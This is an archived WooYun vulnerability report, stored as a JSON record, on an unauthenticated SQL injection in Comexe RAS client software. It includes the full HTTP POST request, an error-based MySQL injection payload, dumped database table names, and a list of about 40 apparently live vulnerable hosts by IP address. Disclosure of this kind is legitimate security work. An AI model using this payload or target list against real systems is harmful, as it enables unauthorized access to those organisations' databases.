{"id": 46805, "wybug_id": "wooyun-2015-0117921", "wybug_title": "科迈某客户端两处SQL注入影响大量系统(无需登录DBA权限)", "wybug_corp": "深圳市科迈通讯技术有限公司", "wybug_author": "YY-2012", "wybug_date": "2015-06-03 11:57", "wybug_open_date": "2015-09-06 09:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向公众公开  简要描述： 附30多个案例。。 详细说明：  科迈RAS标准版客户端(远程快速应用接入)无需登录存在SQL注入。\nPOST /server/cmxpagedquery.php?pgid=AppList&SearchFlag=true HTTP/1.1Content-Length: 136Content-Type: application/x-www-form-urlencodedReferer: http://61.186.152.218:80/Cookie: PHPSESSID=jb7b826hb3p30jf2rdt17mr8n0; RAS_Client_Style=1; g_LanguageID=cn; RAS_Admin_UserInfo_Domain=aa-ecf4369da2f8; temp_DisplayName=tmtgrnvr; temp_Description=%E5%85%81%E8%AE%B8%E7%94%A8%E6%88%B7%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E6%AD%A4%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8A%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B9; ErrorInfo=%3Cbr+%2F%3E%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%3A+Parameter+3%3A+%E7%B1%BB%E5%9E%8B%E4%B8%8D%E5%8C%B9%E9%85%8D%E3%80%82%0D%0A+++%3Cbr+%2F%3E%E9%94%99%E8%AF%AF%E6%89%80%E5%9C%A8%E6%96%87%E4%BB%B6%3A+C%3A%5CProgram+Files%5CComexe%5CRasMini%5Crasweb%5CApache2%5Chtdocs%5Csmarty-2.6.19%5CServer%5CCmxUserGroup.php+%3Cbr+%2F%3E%E9%94%99%E8%AF%AF%E6%89%80%E5%9C%A8%E8%A1%8C%E5%8F%B7%3A+386+%E8%A1%8C%3Cbr+%2F%3EHost: 61.186.152.218Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*AppID%5b-1%5d=651&clear=%e6%b8%85%e7%a9%ba&NMFind=%e6%90%9c%e7%b4%a2&pageNo=&sort=DisplayName&sortType=A&ViewAppFld=1*&ViewAppValue=1\n两个参数存在SQL注入分别是：ViewAppFld和ViewAppValue\n\n   漏洞证明：  \n\n\n\n\n\n\n---Parameter: #1* ((custom) POST)    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: AppID[-1]=651&clear=%e6%b8%85%e7%a9%ba&NMFind=%e6%90%9c%e7%b4%a2&pageNo=&sort=DisplayName&sortType=A&ViewAppFld=1) AND (SELECT 4511 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (ELT(4511=4511,1))),0x71716a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (1461=1461&ViewAppValue=1---web server operating system: Windowsweb application technology: PHP 5.2.6, Apache 2.2.9back-end DBMS: MySQL 5.0Database: rasdatabase[71 tables]+---------------------------+| hbadminrolegroupmembers   || hbadminrolerestrictedorgs || hbadminroletask           || hbadminroleusermembers    || hbclientgroupapplication  || hbclientgroupprinter      || hbdirectoryapplication    || hborgapplication          || hborglicensepolicy        || hborgpolicy               || hbpolicyvalues            || hbroletask                || hbserverapplication       || hbserverprinterdriver     || hbserverprintinf          || hbserverrole              || hbservertask              || hbtaskaction              || hbtaskcondition           || hbuserapplication         || hbuserdirectory           || hbuserorgs                || hbuserpolicy              || lograsarchi               || lograsconcurrenta         || lograsconcurrentus        || lograsent                 || lograssessi               || lograstaskactionhist      || lograstaskhist            || rasactions                || rasadminroles             || rasadmintasks             || rasapplication            || rasbadprinterdriver       || rascfg                    || rasclient                 || rasclientgroup            || rascompatibilitydriver    || rasconcurrentsession      || rasconditions             || rasconnectionsetting      || rasdatabase               || rasdirectory              || rasdmzserverd             || rasdomain                 || rasgroupuser              || rasinfocollectordata      || rasjobs                   || rasjobsteps               || raslicenseinfo            || raslicensetoken           || raslicpolicy              || raslockdownpolicies       || rasmonthlyminute          || rasorgs                   || rasprinter                || rasprinterdriver          || rasproductk               || rasreqids                 || rasroles                  || rasrunningservers         || rasselection              || rasserver                 || rasstyle                  || rastasks                  || rasticketing              || rastimedsessio            || rasuser                   || rasusermng                || usermachines              |+---------------------------+\n案例：http://218.1.41.170:8080/cmxlogin.php?t=14328474426374http://183.230.42.251:81/CmxDownload.phphttp://116.236.205.196/CmxDownload.phphttp://221.13.104.174:8888/CmxDownload.phphttp://61.186.242.110:8080/CmxDownload.phphttp://61.175.246.46:8080/CmxDownload.phphttp://113.204.169.94:8888/CmxDownload.phphttp://116.236.131.194:8080/CmxDownload.phphttp://221.12.100.166:81/CmxDownload.phphttp://222.178.221.54:8080/CmxDownload.phphttp://61.186.152.218/CmxDownload.phphttp://222.177.13.93:8888/CmxDownload.phphttp://180.175.223.220:8000/cmxlogin.php?t=14328287201481http://60.190.177.172:8888/CmxDownload.phphttp://221.239.106.90:81/CmxDownload.phphttp://122.226.31.30:8080/CmxDownload.phphttp://58.222.218.171:8888/CmxDownload.phphttp://erp.ap365.com:8088/CmxDownload.phphttp://61.161.199.197/CmxDownload.phphttp://125.66.20.6/CmxDownload.phphttp://180.168.5.162:8080/CmxDownload.phphttp://111.30.26.38:8000/CmxDownload.phphttp://122.227.188.254/cmxlogin.php?t=14328022273495http://124.67.67.99:8080/CmxDownload.phphttp://61.187.64.183/CmxDownload.phphttp://222.34.131.4:81/CmxDownload.phphttp://58.42.232.99:81/CmxDownload.phphttp://222.163.239.16:8080/CmxDownload.phphttp://115.231.212.82:8080/CmxDownload.phphttp://114.135.72.241:81/CmxDownload.phphttp://58.211.90.4:81/CmxDownload.phphttp://218.26.176.140:8080/cmxlogin.php?t=14327793397546http://61.164.136.94:81/CmxDownload.phphttp://202.104.138.38/CmxDownload.phphttp://115.236.48.147:81/CmxDownload.phphttp://58.246.235.50/CmxDownload.phphttp://218.31.33.158:8001/CmxDownload.phphttp://221.131.95.136:81/CmxDownload.phphttp://60.10.34.57:8888/CmxDownload.phphttp://58.18.169.92/CmxDownload.php   修复方案：  过滤   版权声明：转载请注明来源 YY-2012@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-06-08 09:07 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}